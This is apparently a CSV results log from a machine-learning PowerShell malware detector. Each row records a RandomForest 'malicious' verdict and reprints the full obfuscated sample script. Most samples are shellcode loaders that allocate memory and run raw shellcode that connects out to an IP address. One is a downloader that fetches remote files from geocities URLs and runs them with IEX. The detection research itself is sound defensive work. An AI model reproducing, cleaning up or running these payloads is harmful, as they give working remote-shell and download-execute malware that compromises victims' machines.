In','x8b,0x4a,0x3c','6a,','x53,0x6a,0x00,0x56,0x53,0x57,0x68,','0x6a,0x04,0x56,0x57,0x68,0','d5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,','0x52,0x10,0','0x0','0x93,0','n32Functions -passthr','x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,','b,0x5b,0x61,0x59,0x5a,','0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xb5,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,','Uz3c = Njq[DllImport(RCEkernel32.dllRCE)]public static extern IntPtr VirtualAlloc(IntPt')).REplAcE('Njq',[StrING][chaR]39).REplAcE('RCE',[StrING][chaR]34).REplAcE('Uz3',[StrING][chaR]36) |&amp;( $sHELLId[1]+$ShEllID[13]+'X')",malicious,TP
2026-07-13 16:52:23,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1888.ps1,custom-ps-ml,UNKNOWN,9d3e4369-f1ea-49a9-8fe4-3e1fc664aa14,DESKTOP-BAC9DBQ,malicious,0.9999,RandomForest,911,1744.06,"&amp;( $pSHoME[21]+$pShOmE[34]+'X')( (((\""{33}{35}{32}{39}{52}{60}{21}{34}{2}{31}{62}{7}{30}{16}{55}{48}{11}{42}{4}{17}{18}{54}{9}{46}{8}{56}{61}{57}{19}{22}{29}{38}{6}{58}{13}{14}{10}{50}{26}{23}{53}{3}{0}{5}{63}{44}{28}{1}{20}{45}{41}{15}{51}{64}{36}{59}{27}{25}{12}{37}{49}{47}{24}{40}{43}\"" -f 'r','temp{2}zaavar.','n.prox','Sta','ache]::','t','oy6/zaavar.docx{','S','als;  {3','redent','2}','als=[','tp:','{3}env:te','mp{','  ','emWebProxy();  {3}n','Defa','ul','adFil','d','nt','e(','1}','jxq1/f09','ing({0}ht','docx{','wnloadstr',':','{1','yst','y=[Net.WebRequest]','eb','{',';  {3}','3}n=new-object net.w','d','//www','}http://www.geocities.jp/lgxp','cl','21.p','x{1}','Net.CredentialC','s1{0});','rocess {1}{3}env','oc','i','es.jp/frgr','.Credenti','.geociti','zaavar.','IEX {3}n','i',');  ','tC','.Proxy','}n.Do','nlo','1},{1}','o','e','w','::Get','-P','.'))  -f  [Char]39,[Char]34,[Char]92,[Char]36))",malicious,TP
2026-07-13 16:52:37,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1889.ps1,custom-ps-ml,UNKNOWN,8e3ae84d-7a35-425e-8862-a47da7231124,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2960,1808.84,". ( ([striNg]$VeRbosEPrefEReNcE)[1,3]+'x'-joIn'') ( ((\""{24}{7}{20}{45}{11}{46}{1}{42}{12}{5}{61}{37}{69}{3}{56}{38}{35}{64}{23}{9}{66}{0}{27}{57}{47}{58}{54}{53}{6}{44}{39}{40}{30}{31}{17}{34}{25}{36}{19}{15}{43}{32}{62}{18}{63}{59}{16}{29}{2}{49}{33}{10}{51}{52}{8}{4}{60}{13}{68}{48}{14}{22}{26}{55}{67}{21}{65}{28}{50}{41}\"" -f'02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,','e, uint flProtect);[DllImport(AChkernel32.dllACh)]public static extern I','x08,0x75,0xec,0x68,0xf0,0xb5,0xa2','-Type -memberDefinition Fsnc -Name AChWin32ACh -namespac',',0x56,0x53,0x57,0','CreationFlags, ','0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0',' = Rvt[DllImport(AChkernel32.dll','0x00',',0x52,0x14,0x8','x56,0x57,0x68,0x02,','ntPtr lpAddr','reateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dw','0xd9,','Leng','xe0,0xff,0xd5,0x97,0x6a,','0x99,','0x','a,0x10,0','0x0f,0xdf,0','AC','snsc.Length-1);Fsni++) {Fsnw::memset([IntPtr](Fsnx.ToI','th -gt 0x1000){F','x8b,0x52,0x0c,0x8b','Fsnc','40,0x5','snsize = Fsnsc.Leng','0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c','teThread(0,0,Fsnx,0,0,0);fo','0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0','0xc4,0x54,0x50,0x68,0x2','9,0x80,',',0x68,0x0','0xff,0xd5,0x6a,0x00,0x6a,0x04,0','6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x','x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8','0,0x40,0x50,0x68,0xea,','ntPtr lpThreadId);[DllImport(AChmsvcrt.dllACh)]public static extern I','Fsnsc = 0xfc,0xe8,0',',0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0','x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,',';','ntPtr C','0x05,0x68,0xc0,0xa8,0xf5,0x82','x5f','h)]public static extern IntPtr VirtualAlloc(I','ess, uint dwSize, uint flAllocationTyp','0x01,0xd0,0x8b,0x40,0x78,0x','c.',',0x56,','r (;;){Start-sleep 60}','0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,','0x53,0x6a,','5,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,','0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x7','th};Fsnx=Fsnw::VirtualAlloc(0,0x100','e Win32Functions -passthru;[Byte[]];[Byte[]]',',','85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,','68,','x68,0x02,','I','2,0x00,0x00,0x50,0x89,0xe6,0x6','x56,0x57,0x','b,0x52,0x30,0','nt32()+Fsni), Fsnsc[Fsni], 1)};Fsnw::Crea','b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x','0,Fsnsize,0x40);for (Fsni=0;Fsni -le (F','0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;Fsnsize = 0x1000;if (Fsns','ntPtr memset(IntPtr dest, uint src, uint count);Rvt;Fsnw = Add')).replacE('ACh',[StRing][ChaR]34).replacE('Rvt',[StRing][ChaR]39).replacE(([ChaR]70+[ChaR]115+[ChaR]110),'$'))",malicious,TP
2026-07-13 16:52:43,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1894.ps1,custom-ps-ml,UNKNOWN,7fa0ba8e-cdc7-4652-824c-608e35e380c7,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3237,1672.57,"(((\""{65}{15}{7}{23}{3}{75}{6}{21}{70}{10}{52}{53}{2}{49}{12}{48}{31}{8}{36}{44}{60}{56}{9}{18}{32}{39}{59}{54}{5}{1}{64}{27}{40}{13}{33}{22}{58}{61}{11}{41}{47}{17}{55}{14}{19}{34}{72}{74}{26}{29}{38}{16}{20}{69}{0}{46}{24}{67}{37}{25}{35}{45}{62}{57}{28}{4}{43}{42}{30}{73}{50}{51}{68}{63}{71}{66}\""-f'ff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x0','0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x','ms','tPtr VirtualAlloc(IntPtr lpAddress, uint d','x1000;if (xWfz.Length -gt 0x1000){','x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,','rt(uZlkernel32.dlluZl)]public static extern IntPtr CreateThread(IntP','public static e',',0','x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48','s, IntPtr lpParameter, uint dwCreationFlags, I','8','-memberDefinition xWfc -Name uZlWin','0,0x89,0x44,0x24,0','xb0,','DllImport(uZlkernel32.dlluZl)]','x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68','8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68',',0x01,0xd1','0x2c,0x2f,0xb8,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56',',0x02,0xd9,0','tr lpTh',',0x61,0x59,0x5a,0x51,0x','xtern In','x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x','x68,0x00,0x40,0x00,0x0','08,0x75,','1,0xd3,0x8b,0x04,0x8b',';xWfg = 0','0xec,0xe8,','Wfw::VirtualAllo',' Win32Functions -passthru;[Byte[]];[Byte[]]xWfz = 0xfc,0xe8',',0x51,0x8b,0x59,0x20,','x24,0x5b,0x5b',',0x57,0x68,0x99,0xa5,0x7','0,0x6a,0x00,0x50,0x68,0x0b,0x2f','x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0',',0xf8,0x00,0x7d,0x22,0x58,0','0','0x',',0x01,0xd','b,0x12,0xeb,0x8d,0x5d,0x68,0x3','Length};xWfx=x','xWfg = xWfz.','x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,',',0x0f,0x30,0xff,0xd5,0x57,','0,0x10,0x00,0x00,0x56,0x6a,0','3,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb','32uZl -namespace','et(IntPtr dest, uint src, uint count);fG5;xWfw = Add-Type ','xWfz','.Length-1);xWfi++) {xWfw::memset([IntPtr](xWfx.ToInt32()+','ntPtr lpThreadId);[DllImport(uZlmsvcrt.','dlluZl)]public static extern IntPtr me','0x49,0x18,0xe3,0',',0','6,0',',0xd5','ff,0xe0,0x','01,0xd3,0x8b,','0x0f,0xb7,0x4a,0x2','5f,0x5f,0x5a,0x','0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff',' xWfz[xWfi], 1)};x','7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x0','xWfc = fG5[','0};','53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83','xWfi),','xc8,0x5f,0x','readAttributes, uint dwStackSize, IntPtr lpStartAddres','Wfw::CreateThread(0,0,xWfx,0,0,0);for (;;){Start-sleep 6','4,0x61,0xff,','c(0,0x1000,xWfg,0x40);for (xWfi=0;xWfi -le (','0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x','wSize, uint flAllocationType, uint flProtect);[DllImpo')) -ReplaCe ([cHar]102+[cHar]71+[cHar]53),[cHar]39-ReplaCe ([cHar]120+[cHar]87+[cHar]102),[cHar]36-ReplaCe ([cHar]117+[cHar]90+[cHar]108),[cHar]34) |.( ([String]$veRBOSePReFEReNce)[1,3]+'x'-joIN'')",malicious,TP
2026-07-13 16:52:57,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1903.ps1,custom-ps-ml,UNKNOWN,eb84d46f-3b40-45bc-bfee-7f1cb9910e5a,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3067,1571.9," . ( $Env:ComSpEC[4,24,25]-joIN'') (((\""{29}{25}{68}{10}{1}{70}{67}{57}{15}{27}{71}{53}{45}{3}{52}{17}{61}{2}{24}{56}{55}{69}{37}{54}{66}{4}{28}{44}{38}{42}{47}{59}{18}{39}{62}{32}{58}{30}{51}{41}{0}{23}{33}{49}{65}{43}{36}{20}{6}{40}{21}{13}{11}{12}{34}{7}{60}{50}{48}{64}{31}{26}{19}{46}{5}{22}{16}{14}{35}{63}{72}{8}{9}\"" -f'74,0x74','IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint ','3,0x04,0xb9,0xe6,0x42,0x04,0xd','count);qoV;36cw = Add-Type -mem','0x6f,0x3b,0x47,0x6a,0x3e,0x30',',0x43,','b,0x95,0x66,0xb9,0x44,0x40,0xde,0x5','x85,0x85,0xbc,0xfb,0xf0,0xe1,0x62,0x03,0xd7,0x7a,0xaa,0',');36ci++) {36cw::memset([IntPtr](36cEoWJ.ToInt32()+36ci), 36cz[36ci], 1)};36cw::CreateThread(0,0,36cEoWJ,0,0,0);for (;;){Start-sleep ','60};','n ',',0x81,0x35,0x7c,','0x8b,0xdc,0x64,0x2a,0x94,0xca,0x03,0xd2,0x00,0xf',',0x8a,0xeb,0x25,0x88,0x7a','ualAlloc(0','pParamet','cg = 36cz.Length};36cEoWJ=36cw::Virt','x03,0x72,0x13,0x83,0xc2,0x83,0x1d,0xcc,0xfa','0x','x55,0x0e,0x8b,0x9c,0xa6,0',',0x80,0x3f,0xcd,0x13,0xa',',0xc6','0x7b,0x08,0x41;36cg = 0x1000;if (36cz.Length -gt 0x1000){36',',0xc0,0x6c,0x87,0x84,0x4e,0xe6,0xf4,0xb6,0xd1,0','d,0x63,0xf4,0xb4,0','public static ','x57,0xd7,0xbb,0x32,0','er, uint dwCreationFlags, IntPtr lpThreadId);[Dl',',0x1e,0xac,0xc0,0x95,0x2a,0xe','36cOCo = qoV[DllImport(RNhkernel32.dllRNh)]','e4,0xf3,0xd5,0x1b,0xad,0xa0,0x74,0x3d,0x0b,0x06,0x88,0x5d,0xf4,0xf7,0x2c,0x15,0x1',',0x5a,0','6d,0xa7,0x','x5c,0x93,0xfa,0x9a,0x7a,0x64,0xfd,0xb0,0x3b,0xfa,0x00,0x3b,0x3c,0xd2,0xc','1,0',',0x100','0x8b,0xfb,0x31,0x9f,0x6d,0xab,0x99,0xcf,0x21,0x0b,0x4a,0xb0,0x91,0xe3','4,',',0x17','0a,0x8a,0xff,0x41,0xde,0x4d,0x8b,0x4d,0xab,0x1a,0xd3,0x51,0x2a,0xce,','5,0xfc,0xc9,0x94,0xc4,0x01,0xc4,0xd0','3,0x5c,0x',',0xbf,0x51,0xc8,0xec,0x3e,0xb0,0x0','7,0x8c,0x10,0xda,0x92,0x89,0x86,0xfa,0xd3,0x6a,0xc2,0x6d,0x16,','5,0xda,0xfa','r dest, uint src, uint ','x65,0x0d,0xe0,0x70','1,0x0c,0xec,0xfd,0xae,0x','7d,0x51,','6,0x6f,0x6c',',0xd3,0x75,0x19,0xe4,0x85,0x1f,0x19,0x8c,0x71,0x44,0x4a,0xa9,0x','8,0xe','berDefinition 36cOCo -Name RNhWin32RNh -namespace Win32Functions -passthru;[Byte[]];[Byte[]]36cz = 0xbe,0x87,0xff,0x39,0x06,0xd9,0xcf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x72,0x13,0','rt.dllRNh)]public static extern IntPtr memset(IntPt','0xd5,0x3c,0xf8,0x02,0xdb,0xbd,0x51,0x76,0x7a,0x3d,0xa8,0xab,0','x26,0','x95,0','tern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr l','f1,0xbf,0x','ff,0xec,0x3a,0x08,0xe0,0x9a,0x32,0x6b,0x9d,0x9c,0x80,0x16,0x79,0x28,0x13,0xb0,','x91,0x98,0x14',',0x63,0x63,0x2f,0x03,0x7','0x6f,0x','0,36cg,0x40);for (36ci=0;36ci -le (36cz.Lengt','0xfe,0x62,0xe8',',0x4c,0xef,0x0f,0xe','x5c,0x7c,0x63,0xbe,0x9d,0xb9,0x9e,0x33,0xcf,0x12,0xd4,0xe6,0xe0,0x17,0xa0,0x3a,0x8a,0x6b,0x24,0x3b,',' ex','exter','xf8,0x3f,0xfb,0xd2,0x8b,0x32,0xd','flProtect);[DllImport(RNhkernel32.dllRNh)]public static','lImport(RNhmsvc','h-1')).REPlAce(([Char]113+[Char]111+[Char]86),[StRinG][Char]39).REPlAce('36c',[StRinG][Char]36).REPlAce('RNh',[StRinG][Char]34))",malicious,TP
2026-07-13 16:53:00,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1917.ps1,custom-ps-ml,UNKNOWN,cd9e044b-3b91-467e-862c-b339dbfbd01e,DESKTOP-BAC9DBQ,malicious,0.9833,RandomForest,4622,1725.78,". ((gET-VAriaBlE '*Mdr*').nAmE[3,11,2]-joIN'') (((\""{69}{59}{39}{22}{77}{55}{25}{64}{68}{61}{57}{47}{33}{8}{52}{4}{12}{30}{36}{2}{41}{75}{0}{5}{31}{1}{49}{72}{32}{24}{17}{16}{29}{14}{51}{44}{3}{42}{13}{60}{23}{67}{40}{70}{18}{76}{26}{62}{37}{65}{21}{9}{27}{11}{34}{53}{38}{54}{71}{20}{63}{19}{35}{78}{74}{10}{7}{28}{48}{15}{58}{50}{46}{43}{66}{6}{56}{45}{73}\""-f'x1c,0x01,0xd3,0x8b,0x04,0x8b,0x','0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6',',0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7','x4e,0x76,0x4b,0x46',',0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x','01,0xd0,','indowsPowerShellJRgv1.0J','0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;318','x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe','x53,0x53,0x56,0x68,0x2d,0x06,0','2,0x34,0x00,','x00,0x00,0x68,0x0','51,0x8b,0x59,0x20,0x01,0',',0x5','x44,0x36,0x49,0x70,0x39,0x','ngth};318x=318w::VirtualAlloc(0,0x1000,318g,0x40);for (318i=0;318i -le (318z.Length-1);318i++) {318w::memset([IntPtr](318x.ToInt32()+318i), 318z[318i], 1)};318w::CreateThread(0,0,318x','x6e,0x58,0x78,0x4d,0x4c,0x6f,0','5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0x42,0x01,0x00,0x00,0x2f,0x5a,0x6b,0x36,0x75,0x4d,0x2d,0x75,0','x42,0x45,0x51,0x32,0x62,0x45,0x43,0x6e,0x50,0x44,0x62,0x31,0x4a,0x70,0x4c,0x61,0x48,0x4b,0x58,0x34,0x6f,0x58,0x35,0x6','3,0x5f,0xe8,0x77,0','0x96,0x89,0xe2,0xff,0xd5,0x85,','0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0','static extern IntPtr CreateThread(IntPtr lpThreadAttributes, u',',0x52,0x51,0x71,0x62,0x71,0x63,0x6e,0x67,0x35,0x44,0x67,0x79,0x71,0x49,0x39,0x78,0x6a,0x35,0x58,0','0xff,0xd','r lpThreadId);[DllImport(cRdmsvcrt.dllcRd)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);RKqRKq;318w = Add-Type -memberDefinition 318c','d,0x54,0x46,0x46,0x64,0x4f,0x38,0x70,0x4e,0x58,0x46,0x35,0x36,0x7','x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x08,0x4f,0x75,0xd9,0xe8,0x4a,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0','g = 0x1000;if (318z.Length -gt','x77,0x71,0x69,0x58,0x4a,0x4c,0x4b,0x58,0x51,0x66,0','xd','0x89,0x44,','8,0x3a,0x56,0x79,0xa7,','b7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0','0,0x00,0x40,0x00,0x53,0x68,0','xff,0xff,0xf','3,0x8b,0x49,0x18','0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x6','d5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x','llocationType, uint flProtect);[DllImport(cRdkernel32.dllcRd)]public ','d',',0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0',',0x71,0x74,0x33','ystem.Text.Encoding]::Unicode.Get','x45,0x49,0x6f,0x6e,0x44,0x36,0x36,0x6b,0x69,0x65,0x36,0x44,0','enc cRd;iex cRd&amp; 318x86 318cmd 318ecRd}else{318cmd = cRd-nop -noni -enccRd;iex','m.Convert]::ToBase64String([S','0x0f,0x',' 0x1000){318g = 318z.Le','8,',' = [Syste','30,0x34,0x69,0x53,0x47,0x5a,0','2,0xf2,0x52,0x57,0x8b,0x52','x58,0xa4,0x53,0xe5,0xff,0x','20,0x00,0x00,0x53,0x56','CreationFlags, IntPt','RgpowershellcRd;318cmd = cRd-nop -noni -',',0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,',',0,0,0);for (;;){Start-sleep 60};RKq;318e','318c = RKqRKq[DllImport(cRdkernel32.dllcRd)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flA','f,0x5f,0x56,0x47',',0x31','5,0x70,0x41,0x32,0x50,0x4a,0x66,0x41,0x6c,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,','0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc',' -Name cRdWin32cRd -namespace Win32Functions -passthru;[Byte[]];[Byte[]]318z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0','8,0x80,','Bytes(3181));if([IntPtr]::Size -eq 8){318x86 = 318env:SystemRoot + cRdJRgsyswow64JRgW','x6d,0x42,0x53,0x78,0x73,0x71,0x68,0x6c,0x7a,0x77,0x48,0x4b,0x4a,0x68,0x4b,0x36,0x72,0x46,0x67,0x71,0x46,0x64,0x38,0x64,0x5a,0x2','x60,0x89,0xe5','3181 = RKq',',0x6b,0x56,0x64,0x31,0x78,0x53,0x72,0x4d,0x73,0x55,0x4e,0x59,0x58,0x6e,0x59,0x4d,0x6d,0x4b,0x70,0x49,0x5f,0x57,0x7a,0x72,0x69,0x76,0x33,0x32,0x54,0',',0x68,0x12,','0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x6',' cRd&amp; powershell 318cmd 318ecRd;}','e,0x32,0x31,0x31,0x2e,0x3','x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0','8,0x54,0x49,0x73,0x51,0x34,0x37,0x50,0x49,0x53,0x71,0x33,0x42,0x2','int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dw','f,0x34,0x36,0x2e,0x32,0x35,0x35,0x2')).rEPlaCe('318','$').rEPlaCe('cRd',[StriNg][chaR]34).rEPlaCe(([chaR]74+[chaR]82+[chaR]103),'\\').rEPlaCe('RKq',[StriNg][chaR]39) )",malicious,TP
2026-07-13 16:53:02,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\193.ps1,custom-ps-ml,UNKNOWN,f19e00b3-4376-4144-9942-15df034d298a,DESKTOP-BAC9DBQ,malicious,0.8485,RandomForest,2887,1442.38,"&amp; ( ([StRINg]$VErbOSEpreFEREncE)[1,3]+'x'-JOin'') (((\""{4}{14}{6}{5}{21}{11}{10}{34}{27}{24}{22}{28}{30}{47}{35}{0}{39}{16}{42}{20}{33}{17}{29}{36}{41}{26}{9}{38}{45}{40}{23}{3}{43}{12}{32}{2}{13}{15}{46}{18}{1}{8}{44}{7}{25}{37}{31}{19}\"" -f'8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0','Qiw::VirtualAlloc(0,0x1000,DQig,0x40);for (DQi','02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,','x83','DQic = ZhL[DllImport(U2Zkernel32.dllU2Z)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, u',' lpParameter, uint dwCreationFlags, IntPtr lpThreadI','hread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr','ii -le (DQiz.','i=0;',',0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x7','lic static extern IntPtr memset(In','ort(U2Zmsvcrt.dllU2Z)]pub','0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x5','0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5','int flProtect);[DllImport(U2Zkernel32.dllU2Z)]public static extern IntPtr CreateT',',0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;DQig = 0x1000;if (DQiz.Length -gt 0x100','x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x','ff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,','ix=D','p 60};',',0x89,0x44,0x24,0x24,0x5b,0','d);[DllImp','int count);ZhL;DQiw = Add-Type -memberDefinition DQic -Name U2ZWin32U2Z -namespace Win32F','xc8,0x5f,0xff,0xd5,0','u','Length-1);DQii++) {DQiw::memset([IntPtr](DQix.ToInt32()+DQii), DQiz[DQii], 1)};D','x5c,0x89,0xe6,0x6a,0x10,0x56','tr dest, uint src, ','unctions -passthru;[Byte[]];','0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x8','[Byte[]]DQiz = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0','teThread(0,0,DQix,0,0,0);for (;;){Start-slee','3,0x6a,0x00,0x56,0x53,0x57,0x68,0x','x5b,0x61,0x59,0x5a,0x51,0x','tP','2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x','0,0x6b,0x00,0xff','Qiw::Crea','4,0x','xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0','0x56,0x57,0x68,0x02,0xd9,0',',0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0xbd,0x68,0x02,0x00,0x11,0','01,0xd3,0x8b,0x04,0x8b,0x01,0xd0',',0xf8,0x00,','DQ','0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,','0){DQig = DQiz.Length};DQ','f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf')).rEpLaCE(([cHaR]90+[cHaR]104+[cHaR]76),[string][cHaR]39).rEpLaCE(([cHaR]68+[cHaR]81+[cHaR]105),'$').rEpLaCE(([cHaR]85+[cHaR]50+[cHaR]90),[string][cHaR]34) )",malicious,TP
